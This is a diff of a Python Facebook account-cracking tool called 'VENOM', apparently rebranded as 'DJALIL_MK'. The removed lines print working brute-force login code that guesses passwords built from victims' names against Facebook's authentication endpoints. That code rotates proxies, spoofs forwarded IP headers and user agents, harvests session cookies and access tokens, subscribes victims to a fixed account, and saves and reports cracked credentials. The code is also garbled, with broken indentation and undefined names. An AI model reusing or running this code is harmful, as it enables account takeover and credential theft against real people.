@@ -517,604 +517,28 @@ def menu():
                             elif mthd in ['7','07']:
                                       crack_submit.submit(M_file_7,ids,names,passlist)
                 dino()
-                print('\033[1;32m[\033[1;36m+\033[1;37m] Greetings to you, dear user. I hope that my tool has given you results. ')
-                print('\033[1;32m[\033[1;36m+\033[1;37m] The process has completed ')
-                print('\033[1;32m[\033[1;36m+\033[1;37m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
-                dino()
-                input(' Press enter to back ')
-                os.system('python VENOM.py') 
+             print('\033[1;32m...\033[1;32m Behind every hackers smile...')
+        print('\033[1;32m...\033[1;32m The process has completed')
+        print('\033[1;32m...\033[1;32m OK/CP : '+str(len(oks))+'/'+str(len(cps)))
+        dino()
+input(' Press enter to back ')
+os.system('python DJALIL_MK.py')
             elif xd in ['0','00']:
                 exit(' Thanls For Your Use ')
             elif xd in ['2','02']:
-                os.system('xdg-open https://www.facebook.com/venom.dz.03')
+                os.system('xdg-open https://www.facebook.com/DJALIL_MKm1')     
             else:
                 exit(' Option not found in menu...')
-import random
 
-import random
-
-def UA():
-    a = "Dalvik/2.1.0 (Linux; U; Android 14; OnePlus 12 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/491.0.0.43.114;FBBV/754321894;FBDM/{density=480,width=1264,height=2772};FBLC/en_US;FBRV/684312576]"
-    b = "Dalvik/2.1.0 (Linux; U; Android 13; Samsung Galaxy S23 Ultra Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/487.0.0.35.115;FBBV/731125634;FBDM/{density=560,width=1440,height=3088};FBLC/fr_FR;FBRV/693215840]"
-    c = "Dalvik/2.1.0 (Linux; U; Android 14; Xiaomi 14 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/493.0.0.40.116;FBBV/789321745;FBDM/{density=560,width=1200,height=2670};FBLC/ar_AE;FBRV/708965321]"
-    d = "Dalvik/2.1.0 (Linux; U; Android 14; Google Pixel 8 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/492.0.0.33.116;FBBV/765498213;FBDM/{density=560,width=1344,height=2992};FBLC/en_GB;FBRV/701236954]"
-    e = "Dalvik/2.1.0 (Linux; U; Android 13; Vivo X100 Pro Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/488.0.0.27.112;FBBV/752168934;FBDM/{density=440,width=1080,height=2400};FBLC/fr_FR;FBRV/689214537]"
-    f = "Dalvik/2.1.0 (Linux; U; Android 14; Realme GT 5 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/490.0.0.25.113;FBBV/774589632;FBDM/{density=480,width=1260,height=2772};FBLC/ar_SA;FBRV/712458963]"
-    g = "Dalvik/2.1.0 (Linux; U; Android 13; OPPO Find X7 Ultra Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/489.0.0.38.109;FBBV/743265981;FBDM/{density=480,width=1240,height=2772};FBLC/en_US;FBRV/698521743]"
-    h = "Dalvik/2.1.0 (Linux; U; Android 14; Huawei Mate 60 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/491.0.0.43.114;FBBV/764589312;FBDM/{density=440,width=1212,height=2616};FBLC/fr_FR;FBRV/714895263]"
-    i = "Dalvik/2.1.0 (Linux; U; Android 13; Tecno Phantom V Fold Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/486.0.0.24.112;FBBV/723658914;FBDM/{density=420,width=1080,height=2460};FBLC/ar_EG;FBRV/689475312]"
-    j = "Dalvik/2.1.0 (Linux; U; Android 14; Infinix Zero 30 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/489.0.0.36.115;FBBV/753214698;FBDM/{density=440,width=1080,height=2400};FBLC/en_GB;FBRV/702159874]"
-    k = "Dalvik/2.1.0 (Linux; U; Android 14; Asus ROG Phone 8 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/494.0.0.31.117;FBBV/791263458;FBDM/{density=560,width=1080,height=2448};FBLC/en_US;FBRV/719856432]"
-    l = "Dalvik/2.1.0 (Linux; U; Android 13; Poco F5 Pro Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/487.0.0.35.115;FBBV/745693812;FBDM/{density=440,width=1080,height=2400};FBLC/fr_FR;FBRV/706325481]"
-    m = "Dalvik/2.1.0 (Linux; U; Android 14; Samsung Galaxy Z Fold5 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/492.0.0.33.116;FBBV/789512643;FBDM/{density=560,width=1812,height=2176};FBLC/ar_DZ;FBRV/715236987]"
-    n = "Dalvik/2.1.0 (Linux; U; Android 13; Nothing Phone (2) Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/488.0.0.27.112;FBBV/736214895;FBDM/{density=420,width=1080,height=2412};FBLC/en_US;FBRV/694812357]"
-    o = "Dalvik/2.1.0 (Linux; U; Android 14; Honor Magic 6 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/493.0.0.40.116;FBBV/778954632;FBDM/{density=480,width=1224,height=2700};FBLC/fr_FR;FBRV/711478596]"
-
-    ua = random.choice([a,b,c,d,e,f,g,h,i,j,k,l,m,n,o])
-    return ua
 #------------------[  METODE 1 ]-------------------#
-import requests, random, sys, string, json, uuid, time
-from uuid import uuid4
-oks, cps = [], []
-loop = 0
-session = requests.Session()
-P, M, H, K, B, U, O, N = "P","M","H","K","B","U","O","N"
-def load_proxies(url):
-    try:
-        text = requests.get(url, timeout=10).text
-        return [l.strip() for l in text.splitlines() if l.strip()]
-    except:
-        return []
-proxy_list = load_proxies(
-    "https://raw.githubusercontent.com/VEN0M03/IG/main/PROXSIY.txt"
-)
-def generate_uuid():
-    return uuid4().hex
-import sys, requests
-
-oks = []
-cps = []
-loop = 0
-def generate_fake_ip():
-    return ".".join(str(random.randint(1, 254)) for _ in range(4))
-
-random_ip = generate_fake_ip()
-import requests, uuid, random, string, sys, time, os, base64
-
-oks = []
-loop = 0
-sim_id = 'VENOM'
 def M_file_1(ids,names,passlist):
-    try:
-        global ok,loop,sim_id
-        boos = random.choice([P, M, H, K, B, U, O, N])
-        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌1\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        fn = names.split(' ')[0]
-        sys.stdout.flush()
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-        for pw in passlist:
-            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
-            random_seed = random.Random()
-            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 11; P40 Pro Build/RP1A.200720.011) [FBAN/FB4A;FBAV/375.0.0.25.100;FBPN/com.facebook.katana;FBLC/es_ES;FBBV/37913957;FBCR/Etisalat;FBMF/huawei;FBBD/huawei;FBDV/P40 Pro;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1440,height=3200};FB_FW/1;FBRV/13043395;]','Dalvik/2.1.0 (Linux; U; Android 11; Unknown Build/RP1A.200720.011) [FBAN/FB4A;FBAV/380.1.0.30.115;FBPN/com.facebook.katana;FBLC/en_US;FBBV/37972713;FBCR/Mobily;FBMF/oppo;FBBD/oppo;FBDV/Unknown;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;FBRV/13119411;]','Dalvik/2.1.0 (Linux; U; Android 10; Unknown Build/RP1A.200720.011) [FBAN/FB4A;FBAV/379.0.0.27.106;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/37736226;FBCR/Etisalat;FBMF/oneplus;FBBD/oneplus;FBDV/Unknown;FBSV/10;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;FBRV/13027199;]"
-            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-            nip = random.choice(proxsi)
-            proxs = {
-                   'http': 'socks4://' + nip }
-            data = {
-            "locale": "en_US",
-            "format": "json",
-            "email": ids,
-            "password": pas,
-            "access_token": "1792792947455470|f43b4b4c85276992ac952012f8bba674",
-            "generate_session_cookies": 1,
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "family_device_id": fake.uuid4(),
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
-            "advertiser_id": str(uuid.uuid4()),
-            "currently_logged_in_userid": "0",
-            "client_country_code": "US",
-            "method": "auth.login",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d"}
-            headers = {
-            "Host": "graph.facebook.com",
-            "User-Agent": UA(),
-            "Content-Type": "application/json;charset=utf-8",
-            "Accept-Encoding": "gzip",
-            "forwarded": f"for={random_ip}; by={random_ip}",
-            "x-forwarded-for": random_ip,
-            "x-real-ip": random_ip,
-            "client-ip": random_ip,
-        }
-            url = 'https://graph.facebook.com/auth/login'
-            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
-            if 'session_key' in po:
-                print('\r\r\033[1;32m [VENOM-OK] ' + ids + ' | ' + pas + '\033[93;1m + ' + asha(ids) + '\033[93;1m')
-                send_result("OK", ids, pas)
-                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                cookies = f"sb={ssbb};{coki}"
-                print("\033[1;32m[KOKIS] :\033[1;32m "+cookie)
-                token = po['access_token']
-                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
-                open('/sdcard/VENOM_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VENOM_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
-                oks.append(ids)
-                break
-            elif twf in str(po):
-                  if 'y' in pcp:
-                     print('\r\r\033[1;34m[VENOM-2F] '+ids+' | '+pas)
-                     open('/sdcard/VENOM-2F.txt','a').write(ids+'|'+pas+'\n')
-                     twf.append(ids)
-                     break
-            elif 'www.facebook.com' in po['error']['message']:
-                  if 'y' in pcp:        
-                    print('\r\r\033[1;91m [VENOM-𝐂𝐏] ' + ids + ' | ' + pas + '\033[1;97m')
-                    check_and_send_result(ids, pas, "CP")
-                    open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                    cps.append(ids)
-                    break
-            else:
-                continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        time.sleep(20)
-#------------------[  METODE 2  ]-------------------#
-def M_file_2(ids,names,passlist):
-    try:
-        global ok,loop,sim_id
-        boos = random.choice([P, M, H, K, B, U, O, N])
-        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌2\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        fn = names.split(' ')[0]
-        sys.stdout.flush()
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-        for pw in passlist:
-            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
-            random_seed = random.Random()
-            um = generate_facebook_user2_agent()
-            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-            nip = random.choice(proxsi)
-            proxs = {
-                   'http': 'socks4://' + nip }
-            data={"adid": adid,
-'method': 'POST',
-'format': 'json',
-'device_id': str(uuid.uuid4()),
-'family_device_id': str(uuid.uuid4()),
-'secure_family_device_id': str(uuid.uuid4()),
-'email': ids,
-'password': pas,
-'cpl': 'true',
-'credentials_type': 'password',
-'generate_session_cookies': '1',
-'error_detail_type': 'button_with_disabled',
-'generate_machine_id': '1',
-'locale': 'ar_MA',
-'client_country_code': 'MA',
-'omit_response_on_success': 'false',
-'enroll_misauth': 'false',
-'advertising_id': str(uuid.uuid4()),
-'encrypted_msisdn': '',
-'fb_api_req_friendly_name': 'authenticate'}
-            data={"adid": adid,
-'method': 'POST',
-'format': 'json',
-'device_id': str(uuid.uuid4()),
-'family_device_id': str(uuid.uuid4()),
-'secure_family_device_id': str(uuid.uuid4()),
-'email': ids,
-'password': pas,
-'cpl': 'true',
-'credentials_type': 'password',
-'generate_session_cookies': '1',
-'error_detail_type': 'button_with_disabled',
-'generate_machine_id': '1',
-'locale': 'en_GB',
-'client_country_code': 'GB',
-'omit_response_on_success': 'false',
-'enroll_misauth': 'false',
-'advertising_id': str(uuid.uuid4()),
-'encrypted_msisdn': '',
-'fb_api_req_friendly_name': 'authenticate'}
-            headers = {
-    'Host': 'graph.facebook.com',
-    'Authorization': 'OAuth 1792792947455470|f43b4b4c85276992ac952012f8bba674',
-    'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
-    'x-fb-net-hni': str(random.randint(20000, 40000)),
-    'x-fb-sim-hni': str(random.randint(20000, 40000)),
-    'Zero-Rated': '0',
-    'x-fb-connection-quality': 'EXCELLENT',
-    'x-fb-connection-type': 'MOBILE.LTE',
-    'user-agent': UA(),
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-http-engine': 'Liger',
-    'x-fb-client-ip': 'True',
-    'x-fb-server-cluster': 'True',
-    'accept-encoding': 'gzip, deflate',
-    'connection': 'keep-alive'
-}
-            url = 'https://b-graph.facebook.com/auth/login'
-            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
-            if 'session_key' in po:
-                print('\r\r\033[1;32m [VENOM-OK] ' + ids + ' | ' + pas + '\033[93;1m + ' + asha(ids) + '\033[93;1m')
-                send_result("OK", ids, pas)
-                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                cookies = f"sb={ssbb};{coki}"
-                #print("\033[1;32m[KOKIS] :\033[1;32m "+cookie)
-                token = po['access_token']
-                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
-                open('/sdcard/VENOM_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VENOM_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
-                oks.append(ids)
-                break
-            elif twf in str(po):
-                  if 'y' in pcp:
-                     print('\r\r\033[1;34m[VENOM-2F] '+ids+' | '+pas)
-                     open('/sdcard/VENOM-2F.txt','a').write(ids+'|'+pas+'\n')
-                     twf.append(ids)
-                     break
-            elif 'www.facebook.com' in po['error']['message']:
-                  if 'y' in pcp:        
-                    print('\r\r\033[1;91m [VENOM-𝐂𝐏] ' + ids + ' | ' + pas + '\033[1;97m')
-                    check_and_send_result(ids, pas, "CP")
-                    open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                    cps.append(ids)
-                    break
-            else:
-                continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        time.sleep(20)
-def generate_jazoest(device_id):
-    hash_str = hashlib.md5(device_id.encode()).hexdigest()
-    return '2' + hash_str[:19]
-
-def generate_user_agent():
-    android_versions = ['10', '11', '12', '13']
-    devices = ['SM-G975F', 'SM-G998B', 'Pixel 6', 'Pixel 7', 'Redmi Note 10']
-    return f'Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,124)}.0.0.0 Mobile Safari/537.36'
-
-def facebook_auth(ids, pas):
-    device_id = str(uuid.uuid4())
-    family_device_id = str(uuid.uuid4())
-    adid = str(uuid.uuid4())
-    jazoest = generate_jazoest(device_id)
-import random
-import ipaddress
-from typing import Tuple, Dict, Optional
-def IPV4_REALISTIC_STRONG() -> str:
-    PUBLIC_RANGES = [
-        ("5.8.0.0", "5.11.255.255"),
-        ("23.224.0.0", "23.239.255.255"),
-        ("45.32.0.0", "45.35.255.255"),
-        ("64.225.0.0", "64.225.255.255"),
-        ("66.70.0.0", "66.70.255.255"),
-        ("88.99.0.0", "88.99.255.255"),
-        ("95.217.0.0", "95.217.255.255"),
-        ("128.199.0.0", "128.199.255.255"),
-        ("139.162.0.0", "139.162.255.255"),
-        ("144.76.0.0", "144.77.255.255"),
-        ("147.139.0.0", "147.139.255.255"),
-        ("157.230.0.0", "157.230.255.255"),
-        ("159.65.0.0", "159.69.255.255"),
-        ("162.243.0.0", "162.243.255.255"),
-        ("167.71.0.0", "167.71.255.255"),
-        ("172.104.0.0", "172.105.255.255"),
-        ("176.9.0.0", "176.9.255.255"),
-        ("185.25.180.0", "185.25.183.255"),
-        ("188.166.0.0", "188.166.255.255"),
-        ("192.99.0.0", "192.99.255.255"),
-        ("206.189.0.0", "206.189.255.255"),
-        ("208.67.0.0", "208.67.255.255"),
-    ]
-
-    for _ in range(10_000):
-        start, end = random.choice(PUBLIC_RANGES)
-        ip_int = random.randint(int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end)))
-        ip = ipaddress.IPv4Address(ip_int)
-        if not (ip.is_private or ip.is_reserved or ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_unspecified):
-            return str(ip)
-    raise RuntimeError("لم يتم توليد IP صالح بعد عدة محاولات")
-def make_request_headers(ua: Optional[str] = None, include_fake_forwarded: bool = True
-                        ) -> Tuple[str, Dict[str, str]]:
-    if ua is None:
-        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-
-    random_ip = IPV4_REALISTIC_STRONG()
-    extra_ip = IPV4_REALISTIC_STRONG()
-import requests
-import random
-import uuid
-import string
-import time
-import sys
-import json
-def random_ip():
-    return ".".join(str(random.randint(1, 254)) for _ in range(4))
-
-def generate_ip_pool(num_ips=50):
-    return [random_ip() for _ in range(num_ips)]
-ip_pool = generate_ip_pool(100)
-
-def get_random_ip():
-    global ip_pool
-    if len(ip_pool) < 20:
-        ip_pool.extend(generate_ip_pool(50))
-    
-    return random.choice(ip_pool)
-
-def parse_proxy(p):
-    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
-        proxy_url = p
-    else:
-        proxy_url = "http://" + p
-    return {"http": proxy_url, "https": proxy_url}
-
-def get_proxy():
-    if not proxies_list:
-        return None
-    return parse_proxy(random.choice(proxies_list))
-
-def rotate_session_headers(session, data_type=""):
-    random_ip_address = get_random_ip()
-    user_agents = [
-        # Desktop Chrome
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 125)}.0.0.0 Safari/537.36",
-        # Mobile Android
-        f"Mozilla/5.0 (Linux; Android {random.randint(10, 14)}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 125)}.0.0.0 Mobile Safari/537.36",
-        # Mobile iOS
-        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15, 17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(15, 17)}.0 Mobile/15E148 Safari/604.1",
-        # Facebook App
-        f"[FBAN/FB4A;FBAV/{random.randint(150,200)}.0.0.{random.randint(20,99)}{random.randint(11,99)};FBBV/{random.randint(11111111,99999999)};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/Android {random.randint(10, 14)};FBOP/1;FBCA/x86:armeabi-v7a;]"
-    ]
-    languages = [
-        "en-US,en;q=0.9",
-        "ar;q=0.8,en;q=0.7",
-        "fr;q=0.7,en;q=0.6",
-        "es;q=0.8,en;q=0.7"
-    ]
-    session.headers.update({
-        'User-Agent': random.choice(user_agents),
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': random.choice(languages),
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://www.facebook.com',
-        'Referer': 'https://www.facebook.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'Priority': 'u=1, i',
-        'Connection': 'keep-alive',
-        'X-FB-Friendly-Name': 'authenticate',
-        'X-FB-HTTP-Engine': 'Liger',
-        'X-Forwarded-For': random_ip_address,
-        'X-Client-IP': random_ip_address,
-        'X-Real-IP': random_ip_address,
-        'CF-Connecting-IP': random_ip_address,
-        'True-Client-IP': random_ip_address,
-        'Client-IP': random_ip_address,
-        'X-Originating-IP': random_ip_address,
-        'X-Remote-IP': random_ip_address,
-        'X-Remote-Addr': random_ip_address,
-        'CF-RAY': f"{random.randint(1000000000, 9999999999)}-{random.choice(['SJC', 'LHR', 'FRA', 'SIN'])}",
-        'X-Request-Id': str(uuid.uuid4()),
-        'Cache-Control': 'no-cache, no-store',
-        'Pragma': 'no-cache'
-    })
-    if proxies_list and random.random() > 0.5:
-        session.proxies.update(get_proxy())
-    
-    return session
-session = requests.Session()
-session = rotate_session_headers(session)
-
-def generate_facebook_ua():
-    versions = [
-        f"[FBAN/FB4A;FBAV/{random.randint(150,200)}.0.0.{random.randint(20,99)}{random.randint(11,99)};FBBV/{random.randint(11111111,99999999)};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/Android {random.randint(10, 14)};FBOP/1;FBCA/x86:armeabi-v7a;]",
-        f"[FBAN/FBIOS;FBAV/{random.randint(150,200)}.0;FBBV/{random.randint(11111111,99999999)};FBDV/iPhone{random.randint(8,14)};FBMD/iPhone;FBSN/iOS;FBSV/{random.randint(14,17)}.{random.randint(0,5)};FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;]"
-    ]
-    return random.choice(versions)
-
-def M_file_3(ids, names, passlist):
-    try:
-        global ok, loop, sim_id
-        boos = random.choice(["P", "M", "H", "K", "B", "U", "O", "N"])
-        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌3\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        fn = names.split(' ')[0]
-        sys.stdout.flush()
-        
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-            
-        for pw in passlist:
-            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-            device_id = str(uuid.uuid4())
-            random_seed = random.Random()
-            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-            secure = str(uuid.uuid4())
-            family = str(uuid.uuid4())
-            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-            xd = str(''.join(random_seed.choices(string.digits, k=20)))
-            sim_serials = f'["{xd}"]'
-            current_ip = get_random_ip()
-            data_basic = {
-                'adid': adid,
-                'format': 'json',
-                'device_id': device_id,
-                'email': ids,
-                'password': pas,
-                'generate_analytics_claims': '1',
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'fb_api_req_friendly_name': 'authenticate',
-                'ip_address': current_ip,
-                'client_ip_address': current_ip
-            }
-            data_advanced = {
-                "adid": str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'family_device_id': str(uuid.uuid4()),
-                'secure_family_device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'try_num': '1',
-                'email': ids,
-                'password': pas,
-                'method': 'auth.login',
-                'generate_session_cookies': '1',
-                'sim_serials': "['80973453345210784798']",
-                'openid_flow': 'android_login',
-                'openid_provider': 'google',
-                'openid_emails': f"['{ids}']",
-                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-                'error_detail_type': 'button_with_disabled',
-                'source': 'account_recovery',
-                'locale': 'es_ES',
-                'client_country_code': 'ES',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
-                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'ip_address': current_ip
-            }
-            data_native = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'email': ids,
-                'password': pas,
-                'generate_analytics_claims': '1',
-                'credentials_type': 'device_based_login',
-                'source': 'device_based_login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'fb_api_req_friendly_name': 'authenticate',
-                'device_based_login': 'true',
-                'initial_request_id': str(uuid.uuid4()),
-                'machine_id': str(uuid.uuid4()),
-                'meta_inf_fbapi_req': 'true',
-                'locale': random.choice(['en_US', 'ar_AR', 'fr_FR', 'de_DE']),
-                'client_country_code': random.choice(['US', 'SA', 'FR', 'DE']),
-                'access_token': accessToken,
-                'family_device_id': str(uuid.uuid4()),
-                'secure_family_device_id': str(uuid.uuid4()),
-                'ip_address': current_ip,
-                'client_ip_address': current_ip
-            }
-            data_mfa = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'email': ids,
-                'password': pas,
-                'generate_analytics_claims': '1',
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'true',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'fb_api_req_friendly_name': 'authenticate',
-                'auth_factor': 'password',
-                'next_auth_factor': 'totp',
-                'is_mfa': 'false',
-                'locale': random.choice(['en_US', 'es_ES', 'pt_BR']),
-                'client_country_code': random.choice(['US', 'ES', 'BR']),
-                'access_token': accessToken,
-                'ip_address': current_ip
-            }
-            all_data_types = [data_basic, data_advanced, data_native, data_mfa]
-            data_names = ["BASIC", "ADVANCED", "NATIVE", "MFA"]
-            for i, current_data in enumerate(all_data_types):
                 try:
-                    global session
-                    session = rotate_session_headers(session, data_names[i])
-                    session.headers.update({
-                        'X-Forwarded-For': current_ip,
-                        'X-Client-IP': current_ip,
-                        'X-Real-IP': current_ip
-                    })
-                    
-                    url = 'https://b-api.facebook.com/method/auth.login'
-                    time.sleep(random.uniform(1.5, 3.5))
-                    po = session.post(url, data=current_data, timeout=30, allow_redirects=False)
-                    
-                    if po.status_code == 200:
-                        q = json.loads(po.text)
-                        
-                        if 'session_key' in q:
-                            print(f"\n\033[1;32m⤷⤷ VENOM-OK [{data_names[i]} MODE] | IP: {current_ip}")
-                            print(f"\033[1;32m⤷ EMAIL: {ids}")
-                            print(f"\033[1;31m⤷ PASS: {pas}")
-                            print(f"\033[1;36m⤷ TYPE: {data_names[i]}\033[0m")
-                            token = q['access_token']
-                            try:
-                                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token, timeout=5)
-                            except:
-                                pass
-                            
-                            open('/sdcard/VENOM_m66_OK.txt','a').write(ids+'|'+pas+'|'+data_names[i]+'|'+current_ip+'\n')
-                            oks.append(ids)
-                            return  
-                        
-                        elif 'www.facebook.com' in q.get('error_msg', ''):
-                            if 'y' in pcp:
-                                print(f"\n\033[1;31m⤷⤷ VENOM-CP [{data_names[i]} MODE] | IP: {current_ip}")
